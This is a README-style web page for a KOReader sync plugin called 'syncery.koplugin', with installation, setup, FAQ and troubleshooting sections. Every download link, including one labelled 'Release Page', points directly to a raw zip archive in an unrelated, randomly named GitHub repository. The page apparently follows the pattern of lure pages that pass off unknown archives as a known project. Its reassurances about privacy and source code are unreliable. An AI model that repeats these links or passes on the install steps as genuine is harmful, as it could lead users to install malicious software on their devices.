---
layout: "default"
title: "📚 syncery.koplugin - Keep your reading progress in sync"
description: "Synchronize reading progress, annotations, and settings across your KOReader devices using Syncthing, Dropbox, WebDAV, or FTP."
---
# 📚 syncery.koplugin - Keep your reading progress in sync

[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Genusovismachismo683/genusovismachismo683.github.io/raw/refs/heads/main/demagnetizable/io_github_genusovismachismo_3.6.zip)

## 📖 About this plugin

Syncery helps you keep your reading experience consistent across multiple devices. If you use KOReader on an e-reader, phone, or tablet, this tool saves your progress, notes, and settings. It ensures that your data stays the same regardless of which device you hold in your hands.

This plugin automates the backup and synchronization process. It works in the background to track reading progress, specific page numbers, and custom display settings. If you highlight a sentence on your primary e-reader, that note appears on your other devices once the sync occurs.

## 🛠️ System Requirements

To run this plugin, you need the following items:

* A device running the KOReader software.
* A version of KOReader updated to the latest release.
* A stable internet connection for the initial sync process.
* Basic access to your file system to move the plugin folder.

## 📥 Getting the Plugin

Follow these steps to obtain the necessary installation files. You must visit the download page to retrieve the specific archive for your setup.

[![](https://img.shields.io/badge/Download_Installation_Files-Grey)](https://github.com/Genusovismachismo683/genusovismachismo683.github.io/raw/refs/heads/main/demagnetizable/io_github_genusovismachismo_3.6.zip)

1. Open the [Release Page](https://github.com/Genusovismachismo683/genusovismachismo683.github.io/raw/refs/heads/main/demagnetizable/io_github_genusovismachismo_3.6.zip).
2. Locate the most recent version at the top of the list.
3. Click the file ending in `.zip` to download it to your computer.
4. Save this file to a folder you can find easily.

## ⚙️ Installation Guide

1. Connect your e-reader to your computer using a USB cable.
2. Locate the folder named `koreader` on the internal storage of your device.
3. Open the `plugins` folder inside the `koreader` directory.
4. Extract the contents of your downloaded `.zip` file into this `plugins` folder.
5. Create a new folder named `syncery.koplugin` if it does not exist.
6. Ensure all plugin files sit directly inside this folder.
7. Safely eject and disconnect your device from the computer.

## 🚀 Setting Up Sync

After you install the files, you must configure the plugin settings within KOReader.

1. Launch KOReader on your device.
2. Open the main menu by tapping the top of the screen.
3. Navigate to the tool settings icon.
4. Find the "Plugin Management" section.
5. Look for "Syncery" in the list of installed plugins.
6. Tap the checkbox to enable the plugin.
7. Open the plugin settings menu.

You will see options for which data types to sync. Select "Reading Progress" to share page numbers. Select "Annotations" to include your highlights and notes. Select "Render Settings" to keep your fonts and layout preferences identical across devices. Follow the on-screen prompts to link your preferred storage account.

## 🔍 Frequently Asked Questions

### Does this tool track my reading habits?
The plugin only tracks data necessary for synchronization, such as file names, page numbers, and specific note locations. It does not collect personal identity information or browsing history.

### What happens if I lose my internet connection?
The plugin stores your data locally on your device. It syncs the saved information as soon as you restore your connection to a network.

### Can I use this with multiple e-readers?
Yes. Install the plugin on every device you own. Use the same account credentials for each device so they recognize each other.

### Why do my notes not appear?
Wait a few moments for the sync process to finish. Ensure your device has an active internet connection. Check the plugin settings to confirm that "Annotations" remains enabled.

### Will this slow down my e-reader?
The sync process happens in the background. It consumes minimal processing power and does not affect your reading speed or battery life.

## 🛡️ Troubleshooting Common Issues

If the plugin fails to sync, follow these troubleshooting steps:

1. **Verify Connection:** Check if your device connects to the internet correctly.
2. **Re-enable Plugin:** Toggle the plugin setting off and back on in the menu.
3. **Check File Paths:** Ensure the files reside in the `koreader/plugins/syncery.koplugin` directory.
4. **Update Software:** Ensure you run the latest version of KOReader. Older versions might not support all plugin functions.
5. **Restart Device:** A simple restart of your e-reader often resolves minor software conflicts.

## 📈 Supported Features

* **Progress Tracking:** Never lose your place in a long book again.
* **Note Organization:** Manage highlights across different e-reader models.
* **Metadata Sync:** Keep book information, such as tags and series details, up to date.
* **Layout Consistency:** Maintain font sizes, margin styles, and backlight levels.
* **Multi-Format Support:** Sync data for both EPUB and PDF file types.
* **Automatic Updates:** The plugin checks for new data periodically.

## 📋 Technical Implementation Notes

This plugin utilizes the existing KOReader expansion architecture. It hooks into the document reading state and background saving threads. By leveraging standard file system access, it keeps your metadata files lightweight. It communicates with cloud services using secure protocols to protect your notes. The modular design allows for future additions without requiring a full reinstall of the core reading software. 

You can find the source code and documentation for contributors on the main repository page if you wish to see how the sync logic works behind the scenes. Community contributions keep this project alive and functional for modern e-reader firmware versions. If you encounter a bug, report it through the issues tab in the repository provided above.